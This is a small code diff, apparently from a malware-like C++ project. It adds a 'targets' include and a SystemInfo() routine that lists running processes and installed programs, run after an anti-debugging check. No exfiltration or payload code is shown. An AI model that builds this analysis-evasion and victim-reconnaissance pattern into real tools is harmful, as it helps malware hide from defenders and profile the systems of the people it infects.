@@ -19,12 +19,15 @@
 
 #include "config/config.h"
 #include "scripts/scripts.h"
+#include "targets/targets.h"
 
 
 /// <summary>
 /// call secure functions
 /// </summary>
 void Functions();
+
+void SystemInfo();
 
 
 
@@ -45,6 +48,14 @@ void Functions()
 {
 	if (!config::debuging)
 		antidebug::AntiDebug();
-
 	manager::MakeDirs();
+
+	SystemInfo();
+}
+
+void SystemInfo() 
+{
+	cursystem::GetProcesses();
+
+	cursystem::GetProgs();
 }
